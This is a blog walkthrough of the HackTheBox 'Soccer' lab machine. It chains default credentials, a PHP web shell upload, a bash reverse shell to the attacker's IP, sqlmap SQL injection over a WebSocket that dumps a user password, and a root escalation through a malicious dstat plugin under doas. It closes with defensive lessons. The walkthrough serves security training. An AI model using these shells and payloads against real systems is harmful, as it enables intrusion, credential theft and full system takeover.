+++
title = 'HackTheBox: Soccer Walkthrough'
date = '2025-10-02T00:00:00+00:00'
lastmod = '2025-10-02T00:00:00+00:00'
draft = false
description = 'Complete walkthrough of HackTheBox Soccer machine (10.10.11.194) covering reconnaissance, web exploitation, WebSocket SQL injection, and privilege escalation via doas/dstat'
summary = 'Exploit HackTheBox Soccer by chaining directory enumeration, file upload, WebSocket SQL injection, and doas privilege escalation to achieve root access'
keywords = ['hackthebox soccer', 'websocket sql injection', 'tiny file manager', 'doas privilege escalation', 'dstat exploitation', 'nginx virtual hosts']
tags = ['hackthebox', 'web-exploitation', 'websocket', 'sql-injection', 'privilege-escalation', 'doas']
categories = ['HackTheBox']
author = 'realspaceeagle'
+++

Soccer is a Linux machine from HackTheBox that demonstrates modern web exploitation techniques, including WebSocket-based SQL injection and privilege escalation through doas misconfigurations. This walkthrough covers the complete exploitation chain from initial reconnaissance to root access.

## Machine Information

- **Name**: Soccer
- **IP**: 10.10.11.194  
- **OS**: Ubuntu Linux
- **Difficulty**: Easy
- **Points**: 20

## Initial Setup

```bash
# Add target to hosts file
sudo nano /etc/hosts
10.10.11.194   soccer.htb

# Set up environment variables
LPORT=10.10.14.13
RPORT=10.10.11.194
```

## Reconnaissance

### Nmap Scanning

Starting with comprehensive port scanning to identify open services:

```bash
# Initial TCP scan
sudo nmap -sC -sV -vv -oA nmap/soccer 10.10.11.194

# Full port scan
nmap -p- -oA allports -vvv 10.10.11.194

# UDP scan for additional services
sudo nmap -sU --min-rate 10000 10.10.11.194
```

**Scan Results:**

```
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|   256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
```

The scan reveals three key services:
- SSH on port 22
- HTTP server (nginx) on port 80 redirecting to soccer.htb  
- Unknown service on port 9091 responding to HTTP requests

## Web Enumeration

### Port 80 Analysis

The nginx server redirects to `soccer.htb`, indicating virtual host routing. Let's explore the web application:

```bash
# Directory enumeration
gobuster dir -u http://soccer.htb -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php -o root.gobuster

# Alternative enumeration
feroxbuster -u http://soccer.htb -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
```

### File Manager Discovery

The enumeration reveals a `/tiny` directory containing **Tiny File Manager 2.4.3**. This is a web-based file management system.

**Default Credentials:**
- Username: `admin`
- Password: `admin@123`

The file manager allows:
- File uploads to `/uploads` folder
- Directory browsing
- File editing capabilities

## Initial Access

### Reverse Shell via File Upload

Since we have file upload capabilities, we can upload a PHP reverse shell:

```php
<?php
// Simple PHP reverse shell
system($_GET['cmd']);
?>
```

Upload the shell to `/tiny/uploads/` and execute commands:

```bash
# Set up listener
rlwrap nc -nlvp 9001

# Execute reverse shell via uploaded file
curl "http://soccer.htb/tiny/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.13/9001 0>&1'"
```

Alternative payload using POST request:

```bash
POST /tiny/uploads/shell.php
Content-Type: application/x-www-form-urlencoded

cmd=bash -c 'bash -i /dev/tcp/10.10.14.13/9001 0>&1'
```

### Shell Stabilization

Once we have the initial shell as `www-data`, stabilize it:

```bash
# Spawn TTY shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background and set raw mode
CTRL + Z
stty raw -echo; fg

# Set environment
export TERM=xterm
stty rows 28 cols 110
```

## Post-Exploitation Enumeration

### System Information

```bash
# Check current user and system
id
uname -a
cat /etc/passwd | grep sh

# Process enumeration
ps -ef --forest
ss -lntp
```

### Nginx Configuration Analysis

Exploring the nginx configuration reveals additional virtual hosts:

```bash
# Check nginx sites
ls -la /etc/nginx/sites-enabled/
cat /etc/nginx/sites-enabled/*
```

**Key Finding:** Additional virtual host discovered:

```nginx
# /etc/nginx/sites-enabled/soc-player.htb
server {
    listen 80;
    listen [::]:80;
    server_name soc-player.soccer.htb;
    root /root/app/views;

    location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
    }
}
```

This reveals:
1. Another subdomain: `soc-player.soccer.htb`
2. Application running on localhost:3000
3. WebSocket upgrade support (Connection: 'upgrade')

### Virtual Host Discovery

Add the new virtual host to `/etc/hosts`:

```bash
10.10.11.194   soccer.htb soc-player.soccer.htb
```

## WebSocket Application Analysis

### Discovering the Check Endpoint

Browsing to `http://soc-player.soccer.htb/check` reveals a web application with WebSocket functionality:

```javascript
// WebSocket connection code found in source
var ws = new WebSocket("ws://soc-player.soccer.htb:9091");

ws.onopen = function (e) {
    console.log('connected to the server')
}

function sendText() {
    var msg = input.value;
    if (msg.length > 0) {
        ws.send(JSON.stringify({
            "id": msg
        }))
    }
}
```

This explains the service on port 9091 - it's a WebSocket endpoint that accepts JSON data with an `id` parameter.

## WebSocket SQL Injection

### Initial Testing

The WebSocket endpoint appears vulnerable to SQL injection. Let's test it:

```bash
# Connect to WebSocket using wscat
wscat -c ws://soc-player.soccer.htb:9091

# Test basic injection
> {"id":"1"}
> {"id":"1'"}
> {"id":"1 OR 1=1"}
> {"id":"92130 or 5=1-- -"}
```

### Automated Exploitation with sqlmap

sqlmap supports WebSocket SQL injection:

```bash
# Basic sqlmap test
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --batch

# Comprehensive scan
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --level 5 --risk 3 --batch --threads 10
```

**Results:**

```
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: {"id":"-8259 OR 7504=7504"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
    Payload: {"id":"(CASE WHEN (9039=9039) THEN SLEEP(5) ELSE 9039 END)"}

[INFO] the back-end DBMS is MySQL >= 5.0.12
```

### Database Enumeration

```bash
# Enumerate databases
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --level 5 --risk 3 --batch --threads 10 --dbs

# Dump soccer_db database
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --level 5 --risk 3 --batch --threads 10 -D soccer_db --dump
```

**Database Contents:**

```
Database: soccer_db
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
```

## Lateral Movement

### SSH Access

Using the extracted credentials:

```bash
# SSH as player user
sshpass -p 'PlayerOftheMatch2022' ssh player@10.10.11.194

# Or manually
ssh player@10.10.11.194
# Password: PlayerOftheMatch2022
```

### User Flag

```bash
player@soccer:~$ cat user.txt
[USER FLAG]
```

## Privilege Escalation

### System Enumeration

```bash
# Check sudo privileges
sudo -l

# Find SUID/SGID binaries
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Check for interesting files
find / -user player 2>/dev/null | grep -v '^/proc\|^/run\|^/sys'
find / -group player 2>/dev/null | grep -v '^/proc\|^/run\|^/sys'
```

### doas Discovery

The enumeration reveals `/usr/local/bin/doas` - OpenBSD's alternative to sudo:

```bash
# Find doas configuration
find / 2>/dev/null | grep doas

# Check doas configuration
cat /usr/local/etc/doas.conf
```

**Critical Finding:**

```bash
permit nopass player as root cmd /usr/bin/dstat
```

This configuration allows the `player` user to run `/usr/bin/dstat` as root without a password.

### doas and dstat Analysis

```bash
# Check what dstat is
which dstat
man dstat

# Check directory permissions
find / -group player 2>/dev/null | grep -v '^/proc\|^/run\|^/sys'
```

**Key Discovery:**

```bash
player@soccer:/usr/local/share$ ls -la
drwxrwx---  2 root player 4096 Dec 12  2022 dstat
```

The `player` user has write access to `/usr/local/share/dstat` directory, which is where dstat plugins are stored.

### dstat Plugin Exploitation

dstat allows custom plugins, and we can write to the plugin directory:

```bash
# Create malicious dstat plugin
echo 'import os; os.execv("/bin/sh", ["sh"])' > /usr/local/share/dstat/dstat_exploit.py

# Execute with doas
doas /usr/bin/dstat --exploit
```

**Alternative Method (GTFOBins):**

```bash
# Create user-specific plugin directory
mkdir -p ~/.dstat

# Create malicious plugin
echo 'import os; os.execv("/bin/sh", ["sh"])' > ~/.dstat/dstat_exploit.py

# Execute (this method also works)
dstat --exploit
```

### Root Access

Executing the doas command with our malicious plugin:

```bash
player@soccer:~$ doas /usr/bin/dstat --exploit
# Root shell obtained!

root@soccer:/home/player# id
uid=0(root) gid=0(root) groups=0(root)

root@soccer:/home/player# cat /root/root.txt
[ROOT FLAG]
```

## Attack Chain Summary

1. **Reconnaissance** - Discovered nginx server with virtual host routing
2. **Web Enumeration** - Found Tiny File Manager with default credentials
3. **Initial Access** - Uploaded PHP shell via file manager 
4. **System Enumeration** - Discovered additional virtual host in nginx config
5. **WebSocket Discovery** - Found WebSocket endpoint on port 9091
6. **SQL Injection** - Exploited WebSocket SQL injection with sqlmap
7. **Credential Extraction** - Retrieved player user credentials from database
8. **Lateral Movement** - SSH access as player user
9. **Privilege Escalation** - Exploited doas configuration to run dstat as root
10. **Root Access** - Created malicious dstat plugin for privilege escalation

## Key Techniques Demonstrated

### WebSocket SQL Injection
- Modern applications often use WebSocket for real-time communication
- Traditional web application security tools now support WebSocket testing
- sqlmap can effectively exploit WebSocket-based SQL injection

### doas Privilege Escalation  
- doas is an alternative to sudo with different configuration syntax
- Misconfigurations can allow privilege escalation
- Plugin-based applications (like dstat) can be exploited if plugin directories are writable

### Virtual Host Discovery
- nginx configuration analysis revealed additional attack surfaces
- Multiple applications hosted on same server with different subdomains
- Configuration files often contain valuable enumeration information

## Lessons Learned

### Web Application Security
- **Default Credentials**: Tiny File Manager using default admin/admin@123 credentials
- **File Upload Vulnerabilities**: Unrestricted file upload leading to RCE
- **WebSocket Security**: WebSocket endpoints require same security considerations as HTTP
- **SQL Injection**: Modern injection vectors include WebSocket and other protocols

### Infrastructure Security
- **Virtual Host Enumeration**: Multiple applications increase attack surface
- **Configuration Exposure**: nginx config files revealed additional subdomains
- **Service Discovery**: Unknown ports should be thoroughly investigated

### Privilege Escalation
- **doas Misconfigurations**: Similar to sudo, doas requires careful configuration
- **Plugin-based Applications**: Applications using plugins need secure plugin directories
- **Directory Permissions**: Write access to system directories can lead to privilege escalation
- **SUID/SGID Analysis**: Alternative privilege escalation vectors beyond traditional sudo

### Detection and Prevention

**Security Measures:**
- Change default credentials on all applications
- Implement proper file upload restrictions
- Secure WebSocket endpoints with authentication and input validation
- Regular auditing of sudo/doas configurations
- Implement least privilege principles for application plugins
- Monitor file system permissions and changes

**Monitoring:**
- Log WebSocket connections and data
- Monitor file uploads and executions
- Track privilege escalation attempts
- Alert on configuration file modifications

This machine effectively demonstrates the evolution of web application security challenges, including modern protocols like WebSockets, while reinforcing fundamental security principles around default credentials, file uploads, and privilege escalation.

## Tools and Resources Used

- **Nmap** - Network reconnaissance and port scanning
- **Gobuster/Feroxbuster** - Web directory enumeration  
- **wscat** - WebSocket client for manual testing
- **sqlmap** - Automated SQL injection exploitation
- **Tiny File Manager** - Target application for initial access
- **dstat** - System monitoring tool exploited for privilege escalation

## References

- [WebSocket SQL Injection Cheatsheet](/cheatsheets/websocket-sql-injection/)
- [Linux Privilege Escalation Cheatsheet](/cheatsheets/linux-privilege-escalation/)
- [Web Directory Enumeration Cheatsheet](/cheatsheets/web-directory-enumeration/)
- [Reverse Shell Cheatsheet](/cheatsheets/reverse-shells/)
- [Nginx Configuration Analysis Cheatsheet](/cheatsheets/nginx-configuration-analysis/)

---

*This walkthrough demonstrates the importance of comprehensive enumeration and understanding modern web technologies in penetration testing. The combination of traditional techniques with newer vectors like WebSocket exploitation showcases the evolving landscape of cybersecurity.*